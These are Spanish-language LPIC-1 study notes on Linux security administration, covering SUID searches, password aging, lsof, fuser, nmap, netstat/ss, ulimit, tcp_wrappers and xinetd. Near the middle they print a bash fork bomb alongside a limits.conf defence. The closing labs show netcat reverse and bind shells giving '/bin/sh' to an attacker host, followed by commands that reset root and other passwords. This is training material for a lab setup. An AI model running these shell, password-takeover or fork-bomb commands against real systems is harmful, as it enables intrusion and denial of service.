*Resumen Seguridad de servicos y de red pagina 479 Manual curso LPIC-1


*110.1 Tareas de administración de seguridad
#Lista parcial de archivos, términos y utilidades:

find
passwd
fuser
lsof
nmap
chage
netstat
sudo
/etc/sudoers
su
usermod
ulimit
who, w, last

---

#Este comando busca archivos (-type f) en todo el sistema (/) que tienen el permiso especial SUID (-perm -4000).

find / -type f -perm -4000 -ls

#Este comando busca directorios (-type d) en todo el sistema (/) que tienen el permiso especial SGID (-perm -2000).
El SGID (Set Group ID) asegura que cualquier archivo creado en el directorio herede el grupo del directorio, en lugar del grupo del usuario que lo crea.

find / -type d -perm -2000 -ls

#Este comando busca directorios (-type d) en todo el sistema (/) que tienen el permiso especial Sticky Bit (-perm -1000).

El Sticky Bit permite que solo el propietario del archivo o el root pueda eliminar o renombrar los archivos en ese directorio.

find / -type d -perm -1000 -ls


passwd usuario
passwd --help
Usage: passwd [OPCIÓN...] <accountName>
  -k, --keep-tokens       mantener las marcas de autenticación no vencidos
  -d, --delete            borrar la contraseña para la cuenta indicada (solo root)
  -l, --lock              bloquear la contraseña para la cuenta indicada (solo root)
  -u, --unlock            desbloquear la contraseña para la cuenta indicada (solo root)
  -e, --expire            expirar la contraseña para la cuenta indicada (solo root)
  -f, --force             forzar la operación
  -x, --maximum=DAYS      tiempo de vida máximo de la contraseña (solo root)
  -n, --minimum=DAYS      tiempo mínimo de vida de la contraseña (solo root)
  -w, --warning=DAYS      número de días antes del vencimiento de la contraseña en que los usuarios reciben las advertencias de vencimiento (solo root)
  -i, --inactive=DAYS     número de días después de que venció la contraseña en que se deshabilitará la cuenta (solo root)
  -S, --status            informar el estado de la contraseña de la cuenta indicada (solo root)
  --stdin                 leer símbolos nuevos desde stdin (solo root)

passwd -l usuario
passwd -S usuario
passwd -u usuario
passwd -e usuario
echo 000000 |passwd --stdin user1 #asigna la contraseña 000000


##En Debian ese comando passwd  NO funciona, porque la opción --stdin no la tiene.

chpasswd es una herramienta usada en Debian, Ubuntu, RHEL, Rocky, etc., para cambiar contraseñas de usuarios de forma no interactiva (ideal para scripts)

echo "user1:contraseña" | chpasswd
echo "operador:000000" | chpasswd



##Politica  de contraseña con chage
chage  --help
Opciones:
  -d, --lastday ÚLTIMO_DÍA      establece el día del último cambio de la
                                contraseña a ÚLTIMO_DÍA
  -E, --expiredate FECHA_CAD    establece la fecha de caducidad a FECHA_CAD
  -h, --help                    muestra este mensaje de ayuda y termina
  -I, --inactive INACTIVA       deshabilita la cuenta después de INACTIVA
                                días de la fecha de caducidad
  -l, --list                    muestra la información de la edad de la cuenta
  -m, --mindays DÍAS_MIN        establece el número mínimo de días antes de
                                cambiar la contraseña a DÍAS_MIN
  -M, --maxdays MAX_DAYS        set maximum number of days before password
                                change to MAX_DAYS
  -R, --root CHROOT_DIR         directory to chroot into
  -W, --warndays DÍAS_AVISO     establece los días de aviso de expiración a
                                DÍAS_AVISO
								
chage -l usuario
chage usuario

##Fuerzo el cambio en el proximo inicio de session del usuario:
chage -d 0 usuario


El término lsof es la abreviatura de LiSt Open Files que como lo indica su nombre lista los archivos abiertos
##El comando lsof le ayuda a determinar qué proceso está utilizando un archivo del punto de montaje en el momento de iniciar el comando

lsof --help
lsof /backup/
lsof /backup/
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
bash    8153 root  cwd    DIR   8,17     4096    2 /backup


##Ver todos los puertos que estan listando tanto TCP como UDP:
 lsof -i -P -n
 
#Visualizar los puertos TCP y UDP así como las conexiones activas en el sistema, usando el parámetro -i
lsof -i
lsof -i |grep sshd

#Ver los archivos que esta utilizando un determinado usuario
lsof -u usuario

#Buscar procesos que usan un determinado puerto ej, el puerto 22
lsof -i TCP:22

#Ver archivos abiertos por un proceso o programa concreto
lsof -c httpd
lsof -c sshd

#Mostrar procesos que usan IPv4 o IPV6

lsof -i 4
lsof -i 6

#Ver archivos abiertos por un rango de puertos
lsof -i TCP:1-1024

#Ver archivos en uso por un usuario, en un directorio o path específico
lsof -u nksistemas -a +D /bin



##Como administrador, puede iniciar fuser para forzar la parada de los procesos que estén accediendo al punto de montaje.

El comando fuser se utiliza para identificar los procesos que están utilizando un archivo, directorio o socket específico en un sistema Unix o Linux. Es útil para determinar qué procesos están accediendo a un recurso de archivo o red, especialmente cuando quieres desmontar un sistema de archivos o realizar operaciones administrativas.

fuser --help
-a,--all              display unused files too
  -i,--interactive      ask before killing (ignored without -k)
  -k,--kill             kill processes accessing the named file
  -l,--list-signals     list available signal names
  -m,--mount            show all processes using the named filesystems or block device

fuser -km /backup
kill -9 8153

###El comando nmap es un escaneador de puertos:
yum install nmap -y
apt install nmap -y

nmap --help
nmap localhost

nmap  -v -A 192.168.1.125

-v: Activa el modo verboroso (verbose), lo que significa que nmap mostrará más información sobre el progreso del escaneo mientras se ejecuta.

-A: Activa la detección de sistema operativo y versión de servicios, también intenta detectar scripts y realizar un traceroute (ruta de red). Esta opción proporciona un análisis más detallado del host.

##nap grafico, necesito un entorno grafico X
yum install nmap-frontend -y
zenmap

##Permite ver conexiones:

netstat y ss son herramientas de línea de comandos en sistemas Linux que permiten ver el estado de las conexiones de red, los puertos abiertos, y los sockets en uso. Aunque ambas tienen funciones similares, ss es una herramienta más moderna y rápida en comparación con netstat.

#netstat
netstat muestra información sobre:

Conexiones de red activas (TCP, UDP).
Puertos abiertos (con opciones para filtrar por estado, como LISTEN).
Interfaces de red y estadísticas de tráfico.
Rutas y configuración de enrutamiento.

#Ejemplo de comandos:
netstat -tuln: Muestra puertos TCP/UDP abiertos en modo numérico (sin resolución de nombres).
netstat -anp: Lista todas las conexiones y puertos abiertos, mostrando también el PID y el nombre del proceso.
Nota: netstat está quedando obsoleto en algunas distribuciones y ha sido reemplazado por ss.

#ss
ss (socket statistics) es una herramienta moderna que proporciona la misma funcionalidad que netstat, pero es más rápida y ligera. Ofrece:

Conexiones y sockets de red (más rápido que netstat).
Filtrado detallado en base a estados, puertos, y protocolos.
Información similar sobre rutas y estadísticas de red.
Ejemplo de comandos:

ss -tuln: Muestra los puertos TCP/UDP en escucha en modo numérico.
ss -anp: Lista todas las conexiones y sockets con el PID y el nombre del proceso.
Diferencias Clave
Velocidad: ss es significativamente más rápido.
Obsolescencia: netstat está quedando obsoleto en favor de ss en algunas distribuciones modernas.
Formato: ss ofrece una sintaxis y salida ligeramente distinta, adaptada a nuevas tecnologías de red.

netstat -putona
netstat -i
netstat -r
ss -putona


##Set the limits for oracle in /etc/security/limits.conf file:
ulimit es un comando en sistemas Linux y Unix que establece o muestra los límites de recursos para el shell y los procesos iniciados desde él. Esto es útil para controlar el uso de recursos del sistema por parte de los usuarios o aplicaciones y evitar que consuman recursos de forma excesiva, lo cual podría afectar la estabilidad del sistema.

##Explicación de cada parámetro de los limites:
#Parámetro	Descripción
core	Tamaño máximo de archivos core (en KB). Sirve para debugging cuando un proceso se cae.
data	Tamaño máximo de la sección de datos de un proceso (en KB).
fsize	Tamaño máximo que puede tener un archivo creado por el usuario (en KB).
memlock	Memoria que puede bloquearse en RAM (no swappeable).
nofile	Número máximo de descriptores de archivo abiertos al mismo tiempo.
rss	Tamaño máximo de la memoria residente (en KB) — ya no se aplica en muchas distros modernas.
stack	Tamaño máximo de la pila (stack) del proceso (en KB).
cpu	Tiempo máximo de CPU permitido (en minutos).
nproc	Número máximo de procesos que puede lanzar el usuario.
as	Límite total del espacio de direcciones de un proceso (en KB).
maxlogins	Número máximo de sesiones activas por usuario.
maxsyslogins	Máximo de logins simultáneos a nivel del sistema.
priority	Prioridad de ejecución del proceso (nice value).
locks	Número máximo de locks de archivos.
sigpending	Señales pendientes máximas por usuario.
msgqueue	Memoria máxima para colas de mensajes POSIX (en bytes).
nice	Máximo valor de nice que puede usar un usuario para modificar prioridades. Rango: -20 (más alta prioridad) a 19 (más baja).


ulimit -a

vi /etc/security/limits.conf
* hard nproc 200
oracle soft nproc 2047
oracle hard nproc 16384

oracle soft nofile 1024
oracle hard nofile 65536

@nominas  hard nproc 100 ##@nominas son grupos

#@faculty        hard    nproc           50


su - oracle
ulimit -a

#Bomba fork Bash GNU/Linux
Bomba fork Bash GNU/Linux. Este tipo de bomba lógica es muy conocida ya que no utiliza "comandos" y es bastante
difícil de detectar dentro de un script, por eso hay que tener mucho cuidado de ejecutar scripts sin validar en
sistemas de producción.

:(){ :|:& };:

La explicación del anterior script es la siguiente:

#Función	Descripción
:( )	defina la función ':' , ejecuta esta función
{	el comienzo de qué hacer cuando llamamos a la función ':'
:	carga otra copia de la función ':' en memoria...
|	...y envía la salida a...
:	...otra copia de la función ':', la cual debe ser cargada en memoria
&	hace un "disown" de las funciones -- si la primera ':' es terminada, todas las funciones que dicha función ha empezando deberían ser auto-cerrada
}	fin de la función ':'
;	habiendo definido ':', deberíamos ahora...
:	...llamar a ':', iniciando una reacción en cadena: cada ':' arrancará dos más

###PREVENIR EL ATAQUE DE UNA BOMBA FORK
vi /etc/security/limits.conf

* hard nproc 200


##Comando last
El comando last muestra la lista de los últimos usuarios que han iniciado sesión, así como el sistema, y fecha y hora.
Puedes paginar con |more o |less.
Lo que hace realmente es leer el fichero /var/log/wtmp
Opciones:

last nombredeusuario muestra la lista sólo para ese usuario.

last -n X muestra las X (un número) últimas líneas
last -F Muestra las horas de inicio y fin de sesión
last -f rutaynombredefichero muestra la información respecto a ese fichero en vez del fichero wtmp
last -x muestra las entradas con cambios de apagado o cambios de niveles de ejecución. Para ver cuando se ha apagado y reiniciado. También last -x reboot o last-x shutdown
last -s yesterday -t today Para ver desde (por ejemplo) ayer a hoy.
last -t YYYYMMDDHHMMSS para ver quién estaba registrado a cierta hora. También podemos limitar esto por usuario.
last pts/0 muestra sólo los inicios de sesión por pts/0. Pts es pseudo terminal y tty terminal.

##Para ver la ultima conexion de un usuario:
 lastlog -u vagrant

#who
El comando who muestra información básica sobre los usuarios conectados:

Nombre de usuario.
Terminal (tty o pts) en el que están conectados.
Fecha y hora de inicio de la sesión.
IP o nombre del host desde el cual se han conectado (si es remoto).

#w
El comando w proporciona información más detallada sobre los usuarios conectados y sus actividades:

Nombre de usuario.
TTY (el terminal en el que están conectados).
Fecha y hora de inicio de la sesión.
Tiempo de inactividad de cada usuario.
Carga promedio del sistema (load average).
Proceso o comando que están ejecutando actualmente.


El archivo /etc/nologin en sistemas Linux y Unix es utilizado para bloquear el acceso de usuarios regulares al sistema, especialmente durante tareas de mantenimiento o actualización. Cuando este archivo está presente, el sistema impide el inicio de sesión de los usuarios no privilegiados y muestra un mensaje que especifica que el acceso está restringido.

#Para bloquear el acceso a usuarios regulares y personalizar el mensaje:
echo "El sistema está en mantenimiento. Inténtelo más tarde." | sudo tee /etc/nologin

#Una vez completado el mantenimiento, elimina el archivo para permitir el acceso de nuevo:
sudo rm /etc/nologin

/etc/nologin es una forma sencilla y efectiva de gestionar el acceso al sistema durante tiempos de inactividad.


systemd.socket es una unidad de systemd que define y gestiona sockets (puertos de red o archivos de socket en el sistema de archivos) y activación por socket para servicios en sistemas Linux. En lugar de iniciar un servicio en el arranque o a pedido, systemd.socket permite que el servicio se inicie automáticamente cuando el socket recibe una conexión o solicitud. Esto es especialmente útil para ahorrar recursos, ya que solo se lanzan los servicios cuando son necesarios.

#Ejemplo de un archivo .socket
Supongamos que queremos crear un socket que escuche en el puerto 8080 y active un servicio correspondiente. El archivo /etc/systemd/system/mi_servicio.socket podría verse así:

[Unit]
Description=Socket para Mi Servicio

[Socket]
ListenStream=8080  # Escucha en el puerto 8080 para conexiones TCP
Accept=no          # Determina si se aceptan múltiples conexiones

[Install]
WantedBy=sockets.target

#Ejemplo de un archivo .service
Para vincular el socket al servicio, necesitamos crear un archivo .service correspondiente (/etc/systemd/system/mi_servicio.service):

[Unit]
Description=Mi Servicio

[Service]
ExecStart=/ruta/a/mi_aplicacion  # Comando o aplicación que se ejecutará al recibir una conexión

#Opciones comunes en un archivo .socket
ListenStream: Define un socket de red TCP.
ListenDatagram: Define un socket UDP.
ListenFIFO: Crea un archivo FIFO (pipe).
Accept: Si está en yes, cada conexión crea una instancia separada del servicio, útil para manejar múltiples conexiones.

#Beneficios de systemd.socket
Ahorro de recursos: Los servicios solo se inician cuando hay una conexión.
Escalabilidad: Fácil de gestionar varios servicios y sockets sin necesidad de configuraciones manuales.
Flexibilidad: Puede manejar diferentes tipos de sockets (TCP, UDP, FIFO).
systemd.socket es muy útil para servicios de red y otros que no necesitan ejecutarse en todo momento, mejorando la eficiencia y el control de recursos del sistema.

---------------------------------------------------------------------------------------------------------------
###110.2 Setup host security##

xinetd (Extended Internet Services Daemon) es un supervisor de servicios en sistemas Linux y Unix que gestiona y controla múltiples servicios de red, como FTP, Telnet, y SSH, en una sola instancia. Funciona como un superdaemon, es decir, un programa que escucha en múltiples puertos y lanza los servicios solicitados según la configuración. xinetd reemplazó al antiguo inetd y ofrece más funcionalidades y seguridad.

#Características de xinetd
Control de acceso: Puede restringir el acceso a servicios basándose en la dirección IP de los clientes.
Limitación de conexiones: Permite limitar la cantidad de conexiones simultáneas por servicio, lo que ayuda a prevenir sobrecargas.
Seguridad avanzada: Incluye soporte para configuraciones de autenticación y control de acceso a través de TCP Wrappers.
Registro y monitoreo: xinetd puede registrar las conexiones y actividades de los servicios que maneja.
Programación de servicios: Permite activar y desactivar servicios en momentos específicos, útil para servicios de uso esporádico.

Servicios de red xinetd -->Pagina del manual 419--> Preparación a la certificación LPIC-1.pdf
yum install xinetd
Servicio tftp en xinetd

Los archivos de configuración son: 
• /etc/xinetd.conf: configuración global
• /etc/xinetd.d/*: directorio que contiene los archivos específicos para los servicios.
Existe un archivo por servicio, con el mismo nombre que el especificado en /etc/services.

##Si modificamos ficheros de configuracion reiniciamos los servicios
service xinetd restart 
---------------------------------------------------------------------------------------------
#############Los tcp_wrappers##########

##Resumen manual de LPIC-1 pagina 483 --> Preparación a la certificación LPIC-1.pdf

Las envolturas TCP o simplemente tcp_wrappers permiten la comprobación de los accesos a un servicio de red determinado (service, xinetd, portmapper). Cada programa que utiliza los tcp_wrappersse compila con la librería libwrap de manera estática (el comando ldd no permite ver la librería).

Los archivos de configuración son /etc/hosts.allow y /etc/hosts.deny

##Cada programa que utiliza los tcp_wrappersse compila con la librería libwrap de manera estática
 (el comando ldd no permite ver la librería).
 
[root@sercentos7 ~]# strings -f /usr/sbin/sshd | grep hosts_access
/usr/sbin/sshd: hosts_access

strings -f /usr/sbin/httpd  | grep hosts_access

Si no se devuelve ninguna línea, el programa no utiliza las tcp_wrappers.

#Entre los servicios que utilizan las tcp_wrappers, encontramos:
 • sendmail (incluyendo postfix); 
 • sshd (ssh); 
 • xinetd (y por lo tanto de manera indirecta todos los servicios asociados);
 • vsftpd (ftp);
 • portmap (y por lo tanto nis, nfs); 
 • in.telnetd (telnet), así como la mayoría de los servicios soportados por xinetd;
 • dovecot (imap, pop).
 
#La comprobación de acceso a un servicio embebido TCP se hace en tres etapas: 
 • ¿se autoriza el acceso de manera explícita?
 • si no es el caso, ¿se prohíbe el acceso de manera explícita?
 • si no es el caso, por defecto, se autoriza el acceso. 
 
 
Para verificar una regla, el sistema lee primero /etc/hosts.allow, luego /etc/hosts.deny.
La búsqueda se detiene en la primera correspondencia encontrada. 
Una línea en hosts.allow autoriza la conexión. 
Una línea en hosts.deny prohíbe la conexión. 
Si no se deniega de manera explícita el acceso, se autoriza: la petición no corresponde a ningún criterio.
 
 
Los archivos de configuración son /etc/hosts.allow y /etc/hosts.deny. La sintaxis es común: 
 
#En el ejemplo siguiente: 
• Sólo los miembros de la subred 192.168.33.0 tienen permiso para conectarse al servidor ftp (prohibido para todos los demás). 
• Los anfitriones puesto1 y puesto2 tienen acceso a telnet y portmap.
• Los anfitriones de baddominio.org, excepto trusted, no tienen conexión alguna posible. 
• Se prohíbe el servicio pop/imap a todos los de la red 192.168.0.0, salvo 192.168.1.5. 
 
#/etc/hosts.allow
 vsftpd: 192.168.33. 
 in.telnetd, portmap: puesto1, puesto2 
 ALL:/opt/script/supervisamen
 servicio: lista_de_hosts [:shell_command]

 
# /etc/hosts.deny 
 ALL: .baddominio.org except trusted.baddominio.org UNKNOWN
 vsftpd,in.telnetd,portmap: ALL 
 dovecot : 192.168.0. EXCEPT 192.168.0.5 UNKNOWN

#La lista de clientes admite una sintaxis avanzada:

 • ALL: correspondencia sistemática. 
 • LOCAL: todos los anfitriones cuyo nombre no contiene punto (puesto1, puesto2, etc.). 
 • UNKNOWN: anfitrión cuyo nombre no se puede resolver. 
 • KNOWN: anfitrión cuyo nombre se puede resolver. 
 • PARANOID: anfitrión cuyo nombre no se puede resolver o cuyo IP no tiene resolución inversa. 
 • EXCEPT: permite excluir ciertos anfitriones.
------------------------------------------------------------------------------------------------------------
El comando nc (o netcat) es una poderosa herramienta de red que se utiliza para leer y escribir datos a través de conexiones de red utilizando los protocolos TCP o UDP. Se puede usar para depurar, probar servicios de red, realizar transferencias de archivos y escanear puertos, entre otras cosas.

##Reverse Shell-Netcat:
Ncat no solo funciona los protocolos de red IPv4 y IPv6, ya que proporciona un número casi ilimitado de usos potenciales.

Entre la gran cantidad de características de Ncat está la capacidad de encadenar a los Ncats, redirección de puertos TCP,UDP y SCTP a otros sitios, Soporte SSL, y conexiones proxy a través de SOCKS4 o proxies HTTP 
(con autenticación proxy opcional también)

yum install nmap-ncat -y
$ sudo apt-get update -y
$ sudo apt-get install netcat -y

Este software esta presente en casi todas las distribuciones y es la manera mas sencilla de obener Reverse.
Aun así en los sistemas en producción no suele estar disponible.

##En la máquina del atacante 192.168.33.10 Centos8:
	
nc -lvp 1234

##En la máquina de la víctima 192.168.33.11 debian-10:

nc -e /bin/sh 192.168.33.150 1234



###Bind Shell- Netcat####:

Una bind shell utilizando Netcat. Una bind shell se diferencia de la reverse en que la escucha se realiza en la máquina víctima.
Para el ejemplo la ip de la víctima será la 10.10.10.2

##En la máquina de la víctima debian-10 192.168.33.11:
	
nc -lvp 1234 -e /bin/sh &

##Resolví el problema especificando la versión de la familia de protocolos. nc -4 // usando:
nc -l -4  1234 -e /bin/sh &


##En la máquina del atacante, 192.168.33.11 es la maquina victima:

	
nc 192.168.33.11 1234

 rmp -e nmap-ncat-6.40-19.el7.x86_64 
 yum remove nmap-ncat
 
 
##Laboratorio Reverse Shell-Netcat:
##En la máquina de la víctima debian-10 192.168.33.11:
$ sudo apt-get update -y

$ sudo apt-get install netcat -y	
nc -lvp 1234 -e /bin/sh &


Desde la maquina atacante que es la centos 192.168.33.10
yum install nmap-ncat -y

nc 192.168.33.150 1234
pwd
cat /etc/hostname
adduser sabado04
echo "000000" | passwd  --stdin sabado04
echo "000000" | passwd  --stdin root

echo "000000" | passwd  --stdin vagrant
echo "vagrant" | passwd  --stdin vagrant





##En el servidor 192.168.33.150 maquina victima le abrimos el puerto 12345
yum install nmap-ncat -y

nc -lvp 1234 -e /bin/sh &

-l (listen): Indica a netcat que entre en modo de escucha, permitiendo que actúe como un servidor.

-v (verbose): Activa el modo verboroso, lo que significa que netcat proporcionará detalles adicionales sobre el estado de la conexión. Esto es útil para depuración y para ver cuándo se realiza una conexión.

-p (port): Especifica el puerto en el que netcat debe escuchar. Debe ir seguido del número de puerto.


##Maquina atacante 192.168.33.151:
yum install nmap-ncat -y

nc 192.168.33.150 1234
pwd
cat /etc/hostname
adduser sabado04
echo "000000" | passwd  --stdin sabado04
echo "000000" | passwd  --stdin root

echo "000000" | passwd  --stdin vagrant
echo "vagrant" | passwd  --stdin vagrant


 